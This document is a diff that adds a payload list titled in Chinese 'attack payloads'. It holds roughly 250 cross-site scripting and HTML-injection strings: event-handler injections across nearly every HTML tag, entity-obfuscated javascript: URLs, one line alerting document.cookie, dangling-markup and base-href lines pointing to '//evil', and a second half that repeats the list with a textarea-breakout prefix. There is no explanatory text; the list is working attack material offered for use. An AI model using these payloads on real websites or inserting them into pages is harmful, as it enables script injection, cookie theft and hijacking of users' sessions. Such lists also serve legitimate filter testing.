@@ -1,0 +1,249 @@
+攻击载荷
+<img src="1.png">
+test123<XSS>=&{()}
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><a id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></a>
+"
+"<style>@keyframes slidein {}</style><a style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></a>
+"
+<image src=validimage.png onloadend=alert(28)>
+<details ontoggle=alert(1) open>test</details>
+<style>:target {color: red;}</style><a id=x style="transition:color 10s" ontransitioncancel=alert(42)></a>
+<style>:target {transform: rotate(180deg);}</style><a id=x style="transition:transform 2s" ontransitionrun=alert(44)>
+<a onbeforecopy="alert(1)" contenteditable>test</a>
+<a onbeforepaste="alert(1)" contenteditable>test</a>
+<a onmouseenter="alert(1)">test</a>
+<a onmouseleave="alert(1)">test</a>
+<img referrerpolicy="no-referrer" src="//portswigger-labs.net">
+<link rel=stylesheet href="//evil?
+<embed src="//evil?
+<a href=abc style="width:100%;height:100%;position:absolute;font-size:1000px;">xss<base href="//evil/
+<a href=https://baidu.com/><font size=100 color=red>come bro</font></a>
+<embed src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html
+<a title="&{alert(1)}">XSS</a>
+ <link href="xss.js" rel=stylesheet type="text/javascript">
+<IMG SRC="livescript:[code]">
+<BR SIZE="&{alert('XSS')}">
+<STYLE>@import'http://xss.rocks/xss.css';</STYLE>
+<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+<Img sRC=//xs.sb/mRcN/test.jpg>
+<A HREF="http://baidu.com/">XSS</A>
+<x/onafterscriptexecute=confirm(1);)// 
+<details/open/ontoggle="jAvAsCrIpT&colon;alert&lpar;/1/&rpar;">XXXXX</a>
+<x onauxclick=a=alert,a(domain)>click
+<IMG SRC=javascript:alert("XSS")>
+<details/open/ontoggle=confirm('XSS')>
+<menu id=x contextmenu=x onshow=alert(1)>
+<select onchange=alert(1)><option>1<option>2
+<base href=//baidu.com>
+<link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
+<body onorientationchange=alert(1)>
+<html ontouchend=alert(1)>
+<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>
+<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
+<div style="font-family:foo}color=red;">
+<h1>INJECTX</h1>
+<h2>INJECTX</h2>
+<h3>INJECTX</h3>
+<h4>INJECTX</h4>
+<h5>INJECTX</h5>
+<h6>INJECTX</h6>
+<button form=test onformchange=alert(1)>
+<script/"<a"/src=data:=".<a,[8].some(confirm)>
+<a href="javascript&colon;alert(1)">
+<link rel=stylesheet href=data:text/css,CSS>
+<link rel=stylesheet href=//HOST/FILE>
+<menu id=x contextmenu=x onshow=alert(1)>
+<base href=//knoxss.me>
+<details open ontoggle=alert(1)>
+<svg><a><rect width=99% height=99% /><animate attributeName=herf
+<a onbeforecopy="alert(1)" contenteditable>te22st</a>
+<div style="background-color:red" onmouseenter="alert(bem)">123456</div>
+<a onmouseenter="alert(1)">test</a>
+<DIV onmouseleave="alert(111)" style="BACKGROUND-COLOR: red">123456</DIV>
+<audio controls onseeking="alert(232231)">
+<img onmouseleave="alert(111)" src="smiley.gif" >
+<script/src=//google.com/complete/search?client=chrome&jsonp=alert(1);>
+<a href="javascript&colon;alert&lpar;document&period;domain&rpar;">Click Here</a>
+<link rel="stylesheet" href="http://xss.rocks/xss.css">
+<a href="javascript&colon;alert(1)">XSS</a>
+<a href="java&Tab;script:alert(1)">XSS</a>
+<a href="java&NewLine;script:alert(1)">XSS</a>
+<a href="javascript&colon;alert&lpar;1&rpar;">XSS</a>
+<style type="text/javascript">alert(/99/);</style>
+<abbr onmouseenter="alert(1)">test</abbr>
+<acronym onmouseenter="alert(1)">test</acronym>
+<address onmouseenter="alert(1)">test</address>
+<area onmouseenter="alert(1)">test</area>
+<article onmouseenter="alert(1)">test</article>
+<aside onmouseenter="alert(1)">test</aside>
+<audio onmouseenter="alert(1)">test</audio>
+<b onmouseenter="alert(1)">test</b>
+<base onmouseenter="alert(1)">test</base>
+<basefont onmouseenter="alert(1)">test</basefont>
+<bdi onmouseenter="alert(1)">test</bdi>
+<bdo onmouseenter="alert(1)">test</bdo>
+<bgsound onmouseenter="alert(1)">test</bgsound>
+<big onmouseenter="alert(1)">test</big>
+<blink onmouseenter="alert(1)">test</blink>
+<blockquote onmouseenter="alert(1)">test</blockquote>
+<body onmouseenter="alert(1)">test</body>
+<br onmouseenter="alert(1)">test</br>
+<button onmouseenter="alert(1)">test</button>
+<canvas onmouseenter="alert(1)">test</canvas>
+<caption onmouseenter="alert(1)">test</caption>
+<center onmouseenter="alert(1)">test</center>
+<cite onmouseenter="alert(1)">test</cite>
+<code onmouseenter="alert(1)">test</code>
+<col onmouseenter="alert(1)">test</col>
+<colgroup onmouseenter="alert(1)">test</colgroup>
+<command onmouseenter="alert(1)">test</command>
+<content onmouseenter="alert(1)">test</content>
+<data onmouseenter="alert(1)">test</data>
+<datalist onmouseenter="alert(1)">test</datalist>
+<dd onmouseenter="alert(1)">test</dd>
+<del onmouseenter="alert(1)">test</del>
+<details onmouseenter="alert(1)">test</details>
+<dfn onmouseenter="alert(1)">test</dfn>
+<dialog onmouseenter="alert(1)">test</dialog>
+<dir onmouseenter="alert(1)">test</dir>
+<div onmouseenter="alert(1)">test</div>
+<dl onmouseenter="alert(1)">test</dl>
+<dt onmouseenter="alert(1)">test</dt>
+<element onmouseenter="alert(1)">test</element>
+<em onmouseenter="alert(1)">test</em>
+<embed onmouseenter="alert(1)">test</embed>
+<fieldset onmouseenter="alert(1)">test</fieldset>
+<figcaption onmouseenter="alert(1)">test</figcaption>
+<figure onmouseenter="alert(1)">test</figure>
+<font onmouseenter="alert(1)">test</font>
+<footer onmouseenter="alert(1)">test</footer>
+<frameset onmouseenter="alert(1)">test</frameset>
+<h1 onmouseenter="alert(1)">test</h1>
+<head onmouseenter="alert(1)">test</head>
+<header onmouseenter="alert(1)">test</header>
+<link onmouseenter="alert(1)">test</link>
+<listing onmouseenter="alert(1)">test</listing>
+<main onmouseenter="alert(1)">test</main>
+<map onmouseenter="alert(1)">test</map>
+<mark onmouseenter="alert(1)">test</mark>
+<marquee onmouseenter="alert(1)">test</marquee>
+<menu onmouseenter="alert(1)">test</menu>
+<menuitem onmouseenter="alert(1)">test</menuitem>
+<meter onmouseenter="alert(1)">test</meter>
+<multicol onmouseenter="alert(1)">test</multicol>
+<nav onmouseenter="alert(1)">test</nav>
+<nextid onmouseenter="alert(1)">test</nextid>
+<nobr onmouseenter="alert(1)">test</nobr>
+<noembed onmouseenter="alert(1)">test</noembed>
+<noframes onmouseenter="alert(1)">test</noframes>
+<noscript onmouseenter="alert(1)">test</noscript>
+<ol onmouseenter="alert(1)">test</ol>
+<optgroup onmouseenter="alert(1)">test</optgroup>
+<option onmouseenter="alert(1)">test</option>
+<output onmouseenter="alert(1)">test</output>
+<p onmouseenter="alert(1)">test</p>
+<picture onmouseenter="alert(1)">test</picture>
+<plaintext onmouseenter="alert(1)">test</plaintext>
+<pre onmouseenter="alert(1)">test</pre>
+<progress onmouseenter="alert(1)">test</progress>
+<q onmouseenter="alert(1)">test</q>
+<rb onmouseenter="alert(1)">test</rb>
+<rp onmouseenter="alert(1)">test</rp>
+<rt onmouseenter="alert(1)">test</rt>
+<rtc onmouseenter="alert(1)">test</rtc>
+<ruby onmouseenter="alert(1)">test</ruby>
+<s onmouseenter="alert(1)">test</s>
+<samp onmouseenter="alert(1)">test</samp>
+<section onmouseenter="alert(1)">test</section>
+<select onmouseenter="alert(1)">test</select>
+<shadow onmouseenter="alert(1)">test</shadow>
+<slot onmouseenter="alert(1)">test</slot>
+<small onmouseenter="alert(1)">test</small>
+<source onmouseenter="alert(1)">test</source>
+<spacer onmouseenter="alert(1)">test</spacer>
+<span onmouseenter="alert(1)">test</span>
+<strike onmouseenter="alert(1)">test</strike>
+<strong onmouseenter="alert(1)">test</strong>
+<style onmouseenter="alert(1)">test</style>
+<sub onmouseenter="alert(1)">test</sub>
+<summary onmouseenter="alert(1)">test</summary>
+<sup onmouseenter="alert(1)">test</sup>
+<svg onmouseenter="alert(1)">test</svg>
+<table onmouseenter="alert(1)">test</table>
+<tbody onmouseenter="alert(1)">test</tbody>
+<td onmouseenter="alert(1)">test</td>
+<th onmouseenter="alert(1)">test</th>
+<thead onmouseenter="alert(1)">test</thead>
+<time onmouseenter="alert(1)">test</time>
+<title onmouseenter="alert(1)">test</title>
+<tr onmouseenter="alert(1)">test</tr>
+<track onmouseenter="alert(1)">test</track>
+<tt onmouseenter="alert(1)">test</tt>
+<u onmouseenter="alert(1)">test</u>
+<ul onmouseenter="alert(1)">test</ul>
+<var onmouseenter="alert(1)">test</var>
+<video onmouseenter="alert(1)">test</video>
+<wbr onmouseenter="alert(1)">test</wbr>
+<xmp onmouseenter="alert(1)">test</xmp>
+<D3/OnMouSEenTer=[2].find(confirm)>
+<template onmouseenter="alert(1)">test</template>
+<textarea onmouseenter="alert(1)">test</textarea>
+<tfoot onmouseenter="alert(1)">test</tfoot>
+test"onpointerover="alert(1)"
+test"onloadend="alert(1)"
+test"onchange="alert(1)"
+test"onmouseenter="alert(1)
+test"onmouseleave="alert(1)
+test'onpointerover='alert(1)
+test'onBeforeCopy='alert(1)
+test'onmouseleave='alert(1)
+</tExtArEa>'"><img src="1.png">
+</tExtArEa>'">test123<XSS>=&{()}
+</tExtArEa>'">"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><a id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></a>
+</tExtArEa>'">"<style>@keyframes slidein {}</style><a style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></a>
+</tExtArEa>'"><image src=validimage.png onloadend=alert(28)>
+</tExtArEa>'"><details ontoggle=alert(1) open>test</details>
+</tExtArEa>'"><style>:target {color: red;}</style><a id=x style="transition:color 10s" ontransitioncancel=alert(42)></a>
+</tExtArEa>'"><style>:target {transform: rotate(180deg);}</style><a id=x style="transition:transform 2s" ontransitionrun=alert(44)>
+</tExtArEa>'"><a onbeforecopy="alert(1)" contenteditable>test</a>
+</tExtArEa>'"><a onbeforepaste="alert(1)" contenteditable>test</a>
+</tExtArEa>'"><a onmouseenter="alert(1)">test</a>
+</tExtArEa>'"><a onmouseleave="alert(1)">test</a>
+</tExtArEa>'"><img referrerpolicy="no-referrer" src="//portswigger-labs.net">
+</tExtArEa>'"><link rel=stylesheet href="//evil?
+</tExtArEa>'"><embed src="//evil?
+</tExtArEa>'"><a href=abc style="width:100%;height:100%;position:absolute;font-size:1000px;">xss<base href="//evil/
+</tExtArEa>'"><a href=https://baidu.com/><font size=100 color=red>come bro</font></a>
+</tExtArEa>'"><embed src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html
+</tExtArEa>'"><a title="&{alert(1)}">XSS</a>
+</tExtArEa>'"><link href="xss.js" rel=stylesheet type="text/javascript">
+</tExtArEa>'"><IMG SRC="livescript:[code]">
+</tExtArEa>'"><BR SIZE="&{alert('XSS')}">
+</tExtArEa>'"><STYLE>@import'http://xss.rocks/xss.css';</STYLE>
+</tExtArEa>'"><STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+</tExtArEa>'"><Img sRC=//xs.sb/mRcN/test.jpg>
+</tExtArEa>'"><A HREF="http://baidu.com/">XSS</A>
+</tExtArEa>'"><x/onafterscriptexecute=confirm(1);)// 
+</tExtArEa>'"><details/open/ontoggle="jAvAsCrIpT&colon;alert&lpar;/1/&rpar;">XXXXX</a>
+</tExtArEa>'"><x onauxclick=a=alert,a(domain)>click
+</tExtArEa>'"><IMG SRC=javascript:alert("XSS")>
+</tExtArEa>'"><details/open/ontoggle=confirm('XSS')>
+</tExtArEa>'"><menu id=x contextmenu=x onshow=alert(1)>
+</tExtArEa>'"><select onchange=alert(1)><option>1<option>2
+</tExtArEa>'"><base href=//baidu.com>
+</tExtArEa>'"><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
+</tExtArEa>'"><body onorientationchange=alert(1)>
+</tExtArEa>'"><html ontouchend=alert(1)>
+</tExtArEa>'"><a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>
+</tExtArEa>'"><a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
+</tExtArEa>'"><div style="font-family:foo}color=red;">
+</tExtArEa>'"><h1>INJECTX</h1>
+</tExtArEa>'"><h2>INJECTX</h2>
+</tExtArEa>'"><h3>INJECTX</h3>
+</tExtArEa>'"><h4>INJECTX</h4>
+</tExtArEa>'"><h5>INJECTX</h5>
+</tExtArEa>'"><h6>INJECTX</h6>
+</tExtArEa>'"><button form=test onformchange=alert(1)>
+</tExtArEa>'"><script/"<a"/src=data:=".<a,[8].some(confirm)>
+</tExtArEa>'"><a href="javascript&colon;alert(1)">
+</tExtArEa>'"><d3/onmouseenter=[2].find(confirm)>
